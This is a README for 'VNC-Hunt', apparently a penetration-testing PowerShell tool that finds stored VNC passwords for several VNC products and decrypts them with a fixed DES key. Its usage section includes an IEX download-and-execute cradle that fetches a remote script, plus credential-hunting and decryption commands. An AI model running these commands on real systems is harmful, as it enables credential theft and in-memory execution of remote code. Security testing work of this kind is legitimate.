## About

This PowerShell script searches for VNC passwords stored in the registry and configuration files for various VNC implementations, including RealVNC, TightVNC, TigerVNC, and UltraVNC.
The script identifies and decrypts these passwords using the DES algorithm with a fixed key. It covers the following VNC implementations:
 - RealVNC: Searches the registry for VNC server proxy credentials.
 - TightVNC: Searches the registry for server passwords, control passwords, and view-only passwords.
 - TigerVNC: Searches the registry for server passwords.
 - UltraVNC: Searches for passwords in configuration files located in specified directories.

### Usage
Load into memory
```
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/VNC-Hunt/main/VNC-Hunt.ps1")
```
Hunt for VNC credentials
```
VNC-Hunt
```
Decrypt supplied encrypted password value
```
VNC-Decrypt -Password FACBCF50C3BF1C08
```

![image](https://github.com/The-Viper-One/VNC-Hunt/assets/68926315/8867a265-7afc-4ff2-a9d2-4f0894326199)

